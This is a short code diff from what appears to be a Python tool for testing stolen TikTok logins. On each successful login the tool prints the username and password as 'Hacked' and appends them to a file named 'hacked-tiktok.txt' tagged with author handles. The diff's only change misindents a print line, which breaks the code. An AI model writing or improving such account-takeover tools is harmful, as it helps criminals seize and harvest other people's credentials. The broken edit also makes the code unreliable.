@@ -28,7 +28,7 @@ def Check_login(user,pess):
 			with open('hacked-tiktok.txt', 'a') as J:
 				J.write(user+':'+pess+' |@vv1ck|@TweakPY\n')
 		else:
-			vv1ck(f'[+] Hacked >> {user}:{pess}')
+		vv1ck(f'[+] Hacked >> {user}:{pess}')
 			with open('hacked-tiktok.txt', 'a') as J:
 				J.write(user+':'+pess+' |@vv1ck|@TweakPY\n')
 	elif secure in send.text:
